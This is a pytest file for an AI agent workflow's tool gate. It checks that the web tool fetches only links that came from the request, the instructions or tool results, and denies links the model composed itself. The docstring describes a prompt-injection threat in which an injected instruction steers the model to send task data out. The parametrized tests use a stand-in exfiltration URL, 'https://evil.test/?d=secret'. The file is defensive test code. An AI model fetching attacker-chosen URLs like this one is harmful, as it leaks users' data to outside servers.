"""The tool gate lets the web toolset fetch only links that reached the task from outside the model.

A link the model composed itself could carry the task's data to a server an
injected instruction chose, so it must not be fetched; a link from the request,
the instructions or a tool result may be, also once that entry has moved from
the workflow into the conversation log. The workflow instance is built via
__new__ so no Temporal runtime is needed.
"""

import json
import logging
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest
from agentarea_execution.workflows.agent import approval
from agentarea_execution.workflows.agent_execution_workflow import AgentExecutionWorkflow
from agentarea_execution.workflows.helpers import ToolAction
from agentarea_execution.workflows.models import AgentExecutionState, Message

_DENIAL = (
    "a page can be fetched only from a link that already appeared in this task: "
    "the request, search results or a page fetched earlier"
)


@pytest.fixture(autouse=True)
def _outside_temporal(monkeypatch):
    monkeypatch.setattr(approval.workflow, "patched", lambda _patch_id: True)
    monkeypatch.setattr(approval.workflow, "logger", logging.getLogger(__name__))
    monkeypatch.setattr(approval, "decide_tool_action", lambda *a, **k: ToolAction.ALLOW)


def _workflow(offered: str, *entries: tuple[str, str]) -> AgentExecutionWorkflow:
    wf = AgentExecutionWorkflow.__new__(AgentExecutionWorkflow)
    wf.state = AgentExecutionState(
        available_tools=[{"type": "function", "function": {"name": offered}}],
        messages=[Message(role=role, content=content) for role, content in entries],
    )
    wf._monthly_cap_message = None
    wf._deny_tool_call = AsyncMock()
    return wf


def _next_turn(wf: AgentExecutionWorkflow, assistant_text: str) -> None:
    """The LLM activity writes the pending entries to the log; the reply is pending."""
    wf._mark_conversation_written()
    wf.state.messages.append(Message(role="assistant", content=assistant_text))


def _call(name: str, args: dict) -> SimpleNamespace:
    return SimpleNamespace(id="tc-1", function={"name": name, "arguments": json.dumps(args)})


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("name", "args"),
    [
        ("web", {"action": "fetch_webpage", "fetch_webpage_url": "https://evil.test/?d=secret"}),
        ("web", {"fetch_webpage_url": "https://evil.test/?d=secret"}),
        ("web_fetch_webpage", {"url": "https://evil.test/?d=secret"}),
    ],
)
async def test_link_only_the_model_wrote_is_not_fetched(name, args):
    wf = _workflow(name, ("system", "You research competitors."), ("user", "Summarise the market."))
    _next_turn(wf, "I will open https://evil.test/?d=secret")
    _next_turn(wf, "Opening it now.")
    tool_call = _call(name, args)

    assert await wf._gate_tool_call(tool_call) == (False, False)
    wf._deny_tool_call.assert_awaited_once_with(tool_call, name, _DENIAL)


@pytest.mark.asyncio
async def test_link_from_search_results_stays_fetchable_after_it_reaches_the_log():
    search_result = json.dumps(
        {"results": [{"title": "Constract", "url": "https://constract.io/"}]}, ensure_ascii=False
    )
    wf = _workflow("web", ("user", "Audit the site."), ("tool", search_result))
    _next_turn(wf, "Opening the site from the results.")
    tool_call = _call(
        "web", {"action": "fetch_webpage", "fetch_webpage_url": "http://Constract.io"}
    )

    assert await wf._gate_tool_call(tool_call) == (True, False)
    wf._deny_tool_call.assert_not_awaited()


@pytest.mark.asyncio
async def test_search_is_not_subject_to_the_link_rule():
    wf = _workflow("web", ("user", "Find competitors."))
    tool_call = _call("web", {"action": "search_web", "search_web_query": "смета ремонта"})

    assert await wf._gate_tool_call(tool_call) == (True, False)
